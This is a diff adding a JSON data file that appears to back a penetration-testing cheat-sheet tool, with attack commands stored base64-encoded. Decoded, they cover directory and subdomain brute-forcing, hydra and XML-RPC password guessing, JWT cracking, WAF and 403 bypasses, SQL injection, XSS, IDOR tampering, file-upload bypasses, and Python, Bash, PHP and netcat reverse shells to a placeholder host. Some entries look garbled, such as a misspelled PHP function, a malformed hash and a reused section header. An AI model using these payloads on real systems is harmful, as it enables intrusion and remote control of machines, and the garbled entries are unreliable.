@@ -1,0 +1,158 @@
+[
+  {
+    "button_name": "Info Gathering For All",
+    "note_header": "Information Gathering For All Services",
+    "contents": [
+      {
+        "sub_header": "Directory and File Fuzzing with Ffuf",
+        "content": "ZmZ1ZiAtdyAvdXNyL3NoYXJlL3dvcmRsaXN0cy9kaXJiL2NvbW1vbi50eHQgLXUgImh0dHBzOi8vW2lwXS9GVVpaIiAtbWMgMjAw"
+      },
+      {
+        "sub_header": "WordPress XML-RPC Password Bruteforce",
+        "content": "Y3VybCAtWCBQT1NUIC1kICc8bWV0aG9kQ2FsbD48bWV0aG9kTmFtZT53cC5nZXRVc2VycyBCbG9nczwvbWV0aG9kTmFtZT48cGFyYW1zPjxwYXJhbT48dmFsdWU+YWRtaW48L3ZhbHVlPjwvcGFyYW0+PHBhcmFtPjx2YWx1ZT5QQVNTX0hFUkU8L3ZhbHVlPjwvcGFyYW0+PC9wYXJhbXM+PC9tZXRob2RDYWxsPicgaHR0cHM6Ly9baXBdL3htbHJwYy5waHA="
+      },
+      {
+        "sub_header": "Subdomain Brute-forcing with Gobuster",
+        "content": "Z29idXN0ZXIgZG5zIC1kIGV4YW1wbGUuY29tIC13IC91c3Ivc2hhcmUvd29yZGxpc3RzL2Rpc2NvdmVyeS9kbnMvbmFtZWxpc3QudHh0"
+      },
+      {
+        "sub_header": "Jenkins Dashboard Bruteforce using Hydra",
+        "content": "aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgW2lwXSBodHRwLXBvc3QtZm9ybSAiL2xvZ2luOkpfVVNFUk5BTUU9XlVTRVImSl9QQVNTV09SRD1eUEFTU14mZnJvbT0lMkY6SW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZCI="
+      },
+      {
+        "sub_header": "JSON Web Token (JWT) Secret Cracking",
+        "content": "aGFzaGNhdCAtbSAxNjUwMCBqd3RfdG9rZW4udHh0IC91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0"
+      }
+    ]
+  },
+  {
+    "button_name": "Info Gathering For Web",
+    "note_header": "Information Gathering For Web",
+    "contents": [
+      {
+        "sub_header": "Identifying Hidden Admin Panels with Ffuf",
+        "content": "ZmZ1ZiAtdyAvdXNyL3NoYXJlL3dvcmRsaXN0cy9zZWNsaXN0cy9EaXNjb3ZlcnkvV2ViLUNvbnRlbnQvY29tbW9uLnR4dCAtdSAgaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vRlVaWiAtbWMgMjAwLDMwMQ=="
+      },
+      {
+        "sub_header": "Checking for Exposed Git Repositories",
+        "content": "Y3VybCAtcyAtZiAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vLmdpdC9jb25maWci"
+      },
+      {
+        "sub_header": "Automated Virtual Host Discovery",
+        "content": "Z29idXN0ZXIgdmhvc3QgLXUgIGh0dHBzOi8vPHRhcmdldC1kb21haW4+IC13IC91c3Ivc2hhcmUvd29yZGxpc3RzL3NlY2xpc3RzL0Rpc2NvdmVyeS9ETlMvbmFtZWxpc3QudHh0"
+      }
+    ]
+  },
+  {
+    "button_name": "Bypassing For Web",
+    "note_header": "Random Bypassing Techniques For Web",
+    "contents": [
+      {
+        "sub_header": "Bypassing 403 Forbidden with X-Forwarded-For",
+        "content": "Y3VybCAtcyAtaCAiWC1Gb3J3YXJkZWQtRm9yOiAxMjcuMC4wLjEiIGh0dHBzOi8vPHRhcmdldC1kb21haW4+L2FkbWlu"
+      },
+      {
+        "sub_header": "Path Normalization Bypass via Dot Segments",
+        "content": "Y3VybCAtcyAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vYWRtaW4vLi4vLi8i"
+      },
+      {
+        "sub_header": "WAF Bypass via Double URL Encoding",
+        "content": "Y3VybCAtcyAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vc2VhcmNoP3E9JTI1M2Mtc2NyaXB0JTI1M2Ui"
+      }
+    ]
+  },
+  {
+    "button_name": "Reverse Shell",
+    "note_header": "Payloads For Reverse Shell (RevShell)",
+    "contents": [
+      {
+        "sub_header": "Python: Basic Reverse Shell",
+        "content": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiSFlQRVJfSVAiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw=="
+      },
+      {
+        "sub_header": "Bash: TCP Reverse Shell",
+        "content": "YmFzaCAtaSA+JiAvZGV2L3RjcC9IWVBFUl9JUC80NDQ0IDA+JjEK"
+      },
+      {
+        "sub_header": "PHP: Exec Reverse Shell",
+        "content": "cGhwIC1yICckc29jaz1mcz9ja29wZW4oIkhZUEVSX0lQIiw0NDQ0KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc="
+      },
+      {
+        "sub_header": "Netcat: Traditional Shell (-e)",
+        "content": "bmMgSFlQRVJfSVAgNDQ0NCAtZSAvYmluL2Jhc2g="
+      }
+    ]
+  },
+  {
+    "button_name": "SQLi (MySQL)",
+    "note_header": "SQL Injection Payloads And Tips For MYSQL (SQLi)",
+    "contents": [
+      {
+        "sub_header": "Classic Authentication Bypass with Tautology",
+        "content": "J3VuaW9uIHNlbGVjdCAxLCdhZG1pbicsJzgxZGNkYmFmYmJlYWQxMDViYmRlNzRiMWQ2ODdhYmVmJyMj"
+      },
+      {
+        "sub_header": "Extracting MySQL Version via Error (UpdateXML)",
+        "content": "JyBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDAsdmVyc2lvbigpKSwxKSM="
+      },
+      {
+        "sub_header": "Bypassing Quotes with Hex Encoding",
+        "content": "J3VuaW9uIHNlbGVjdCAweDYxNjQ2ZDY5NmU="
+      },
+      {
+        "sub_header": "Finding Column Count via Order By",
+        "content": "JyBvcmRlciBieSAxMCNo"
+      }
+    ]
+  },
+  {
+    "button_name": "XSS",
+    "note_header": "Cross-Site Scripting (XSS)",
+    "contents": [
+      {
+        "sub_header": "Bypassing Logic via Case-Folding Tags",
+        "content": "PHNDUklQVD5hbGVydCgxKTwvU0NSSVBUPg=="
+      },
+      {
+        "sub_header": "Exploiting Image Sourcing Errors",
+        "content": "PGltZyBzcmM9eCBvbmVycm9yPSJhbGVydChkb2N1bWVudC5kb21haW4pIj4="
+      },
+      {
+        "sub_header": "SVG-Based Payload with Animate Attributes",
+        "content": "PHN2Zz48YW5pbWF0ZSBvbmJlZ2luPSJhbGVydCgxKSIgYXR0cmlidXRlTmFtZT0ieCIgZnJvbT0iMCIgdG89IjEwIiBkdXI9IjFzIiAvPjwvc3ZnPg=="
+      },
+      {
+        "sub_header": "Bypassing Filter via JavaScript Template Literals",
+        "content": "JHtpbnB1dD9hbGVydCgxKToxfQ=="
+      }
+    ]
+  },
+  {
+    "button_name": "IDOR",
+    "note_header": "Insecure Direct Object References Techniques",
+    "contents": [
+      {
+        "sub_header": "IDOR via Parameter Pollution",
+        "content": "Y3VybCAtcyAiaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vYXBpL3ZpZXc/aWQ9MTIzJmlkPTQ1NiIgLS0gU2VuZGluZyBtdWx0aXBsZSBpbnN0YW5jZXMgb2YgdGhlIHNhbWUga2V5IHRvIHNlZSBpZiB0aGUgYXBwIHZhbGlkYXRlcyBvbmUgYnV0IHJldHJpZXZlcyB0aGUgb3RoZXIu"
+      },
+      {
+        "sub_header": "Exploiting IDOR via HTTP Method Switching",
+        "content": "Y3VybCAtWCBQVVQgLWQgJ3siZW1haWwiOiJldmlsQGF0dGFjay5jb20ifScgaHR0cHM6Ly88dGFyZ2V0LWRvbWFpbj4vYXBpL3VzZXIvMTIzIC0tIFRlc3RzIGlmIHRoZSBHRVQgZW5kcG9pbnQgaXMgcmVhZC1vbmx5IGJ1dCBQVVQvREVMRVRFIGxhY2tzIEFDTHMu"
+      }
+    ]
+  },
+  {
+    "button_name": "File Upload",
+    "note_header": "Insecure Direct Object References Techniques",
+    "contents": [
+      {
+        "sub_header": "Bypassing Extension Filters via Double Extensions",
+        "content": "Y3VybCAtRiAiZmlsZUBzaGVsbC5qcGcubGZpIiBodHRwczovLzx0YXJnZXQtZG9tYWluPi91cGxvYWQgLS0gVGVzdHMgaWYgdGhlIFdBRiBzdG9wcyBhdCB0aGUgZmlyc3QgZGV0ZWN0ZWQgZXh0ZW5zaW9uIHdoaWxlIHRoZSBzZXJ2ZXIgZXhlY3V0ZXMgdGhlIGxhc3Qu"
+      },
+      {
+        "sub_header": "Exploiting Null Byte Injection in Filenames",
+        "content": "Y3VybCAtRiAiZmlsZUBzaGVsbC5waHAlMDBqcGciIGh0dHBzOi8vPHRhcmdldC1kb21haW4+L3VwbG9hZCAtLSBJZiB0aGUgdmFsaWRhdG9yIGlzIHdyaXR0ZW4gaW4gSGlnaC1sZXZlbCBsYW5ndWFnZXMgYnV0IHRoZSBPUyB1c2VzIEMsIGl0IG1heSB0cnVuY2F0ZSBhZnRlciBwaHAu"
+      }
+    ]
+  }
+]
